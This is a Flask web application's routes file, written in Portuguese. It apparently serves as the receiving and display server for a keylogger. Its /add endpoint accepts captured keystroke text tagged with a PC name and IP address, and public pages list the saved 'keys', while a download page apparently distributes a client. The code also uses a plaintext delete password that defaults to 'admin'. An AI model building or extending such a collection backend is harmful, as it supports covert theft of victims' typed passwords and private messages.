from flask import render_template, url_for, redirect, request, jsonify
from app import app, db
from sqlalchemy import desc

from datetime import datetime

from app.models.tables import Save_keys
from app.models.forms import Delet_form
from app.controllers.respostas import resposta_cod_add
from app.controllers.texte_manager import limitar_texto, verificar_arg_secundarios_dict


@app.route('/')
def home():
    saves = Save_keys.query.order_by(Save_keys.id.desc()).limit(5).all()
    
    for i in range(len(saves)):
        saves[i].texto = limitar_texto(saves[i].texto, 200)
        
    return render_template('home.html', saves=saves)


@app.route('/save/<id>', methods=['POST', 'GET'])
def tsave(id):
    save = Save_keys.query.get(id)
    form = Delet_form()
    msg = ''

    if form.validate_on_submit():
        if form.data['senha'] == save.senha_delete:
            db.session.delete(save)
            db.session.commit()
            return redirect(url_for('teclas_salvas'))
        else:
            msg = 'Senha incorreta'
    
    return render_template('save.html', save=save, form=form, msg=msg)


@app.route('/teclasalvas')
@app.route('/teclasalvas/page/<pg>')
def teclas_salvas(pg=1):
    QNT_VIS_PAGE = 5 #Quantidade de itens que seram visualizados em uma unica pagina
    page = int(pg)
    
    pgmx = (page-1) * QNT_VIS_PAGE
    save = Save_keys.query.filter(Save_keys.id <= Save_keys.query.count() - pgmx).order_by(desc(Save_keys.id)).limit(QNT_VIS_PAGE)

    if page <= 1:
        beforepage = 1
    else:
        beforepage = page - 1

    if save.count() < QNT_VIS_PAGE:
        nextpage = page
    else:
        nextpage = page + 1

    saves = save.all()
    for i in range(len(saves)):
        saves[i].texto = limitar_texto(saves[i].texto, 600)
        
    return render_template('teclas-salvas.html', saves=saves, page=page, nextpage=nextpage, beforepage=beforepage, QNT_VIS_PAGE=QNT_VIS_PAGE)


@app.route('/download')
def download():
    return render_template('download.html')


@app.route('/add', methods=['POST'])
def add():
    body = request.get_json()
    for p in ('pcname', 'texto'):
        if p not in body:
            return resposta_cod_add(cod=400, msg=f'O parametro [{p}] é obrigatorio! ')
    
    body = verificar_arg_secundarios_dict(body=body, arg='criador', padrao='Anonymo')
    body = verificar_arg_secundarios_dict(body=body, arg='ip', padrao=None)
    body = verificar_arg_secundarios_dict(body=body, arg='senha_delete', padrao='admin')

    me = Save_keys(pcname=body['pcname'], texto=body['texto'], data=datetime.now(), criador=body['criador'], ip=body['ip'], senha_delete=body['senha_delete'])
    db.session.add(me)
    db.session.commit()

    return resposta_cod_add(cod=200, msg='Cadastrado com Sucesso!')

